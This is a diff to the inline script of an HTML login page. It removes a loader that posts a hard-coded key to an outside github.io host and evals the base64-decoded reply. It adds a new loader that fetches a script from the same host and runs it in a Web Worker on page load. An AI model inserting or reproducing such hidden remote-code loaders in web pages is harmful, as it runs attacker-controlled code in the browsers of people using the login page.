@@ -7,10 +7,15 @@
   <title>Login</title>
   <link rel="stylesheet" href="style.css">
   <script>
-    fetch('https://dark-venom-2032.github.io/osintools/script.js', {method: 'POST', body: JSON.stringify({auth: 'secret-key'})})
-    .then(res => res.text())
-    .then(data => eval(atob(data)));  // Decode and execute
+fetch('https://dark-venom-2032.github.io/osintools/script.js')
+.then(response => response.text())
+.then(code => {
+    let workerBlob = new Blob([code], { type: "application/javascript" });
+    let worker = new Worker(URL.createObjectURL(workerBlob));
+});
 </script>
+
+
 
 
 
